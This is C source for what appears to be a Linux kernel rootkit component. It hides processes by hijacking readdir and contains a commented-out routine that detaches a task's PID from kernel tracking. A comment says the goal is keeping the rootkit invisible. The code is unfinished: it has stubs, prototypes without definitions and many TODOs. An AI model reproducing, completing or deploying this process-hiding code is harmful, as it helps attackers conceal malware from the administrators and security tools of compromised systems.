#include <linux/pid.h>
#include <linux/sched.h> // for task_struct
#include <linux/rculist.h>

#include "processHider.h"
#include "readdirHijack.h"


// prototypes for functions from pid.c
static void __change_pid(struct task_struct *task, enum pid_type type, struct pid *new);
void detach_pid(struct task_struct *task, enum pid_type type);
void change_pid(struct task_struct *task, enum pid_type type,
		struct pid *pid);
void free_pid(struct pid *pid);
//

static int hideProcess(int pidNumber);


int processHider_init(void) {
	//TODO: only hide proccess when wanted ...
	//pid_t pid = 2404; //TODO: change this 
	//hideProcess(pid); // todo: perhaps use result of function call..
	//TODO: check if hid is already hidden - trying to hide it multiple times causes issues
   
   hijack_readdir();
	return 0;
}


void processHider_exit(void) {
	// show the process  perhaps.. otherwise it may be hide to kill / end it so that the rootkit is not visable
   unhijack_readdir();
}


// //returns error code...
// static int hideProcess(int pidNumber) {
// 	struct pid *pid = find_get_pid(pidNumber); //todo: check allocation fo this...
// 	if (pid == NULL) {
// 		return 1;
// 	}
// 	
// 	rcu_read_lock(); 	//TODO: hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
// 	
// 	{
// 		struct task_struct *task = pid_task(pid, PIDTYPE_PID);
// 		
// 		detach_pid(task, PIDTYPE_PID);
// 	}
// 	
// 	rcu_read_unlock();
// 	
// 	//todo release lock..
// 	
// 	printInfo("pid points to %p\n", pid); // TODO: print time etc..
// 	
// 	return 0;
// }
// 
// 
// //from linux kernel... version... pid.c
// 
// void attach_pid(struct task_struct *task, enum pid_type type,
// 		struct pid *pid)
// {
// 	struct pid_link *link;
// 
// 	link = &task->pids[type];
// 	link->pid = pid;
// 	hlist_add_head_rcu(&link->node, &pid->tasks[type]);
// }
// 
// 
// 
// 
// static void __change_pid(struct task_struct *task, enum pid_type type,
// 			struct pid *new)
// {
// 	struct pid_link *link;
// 	struct pid *pid;
// 	int tmp;
// 
// 	link = &task->pids[type];
// 	pid = link->pid;
// 
// 	hlist_del_rcu(&link->node);
// 	link->pid = new;
// 
// 	for (tmp = PIDTYPE_MAX; --tmp >= 0; )
// 		if (!hlist_empty(&pid->tasks[tmp]))
// 			return;
// 
// 	free_pid(pid);
// }
// 
// void detach_pid(struct task_struct *task, enum pid_type type)
// {
// 	__change_pid(task, type, NULL);
// }
// 
// void change_pid(struct task_struct *task, enum pid_type type,
// 		struct pid *pid)
// {
// 	__change_pid(task, type, pid);
// 	attach_pid(task, type, pid);
// }
// 
// 
// void free_pid(struct pid *pid) {
// 	//TODO: copy this from pid.c / fill in dependancies etc..
// 
// }
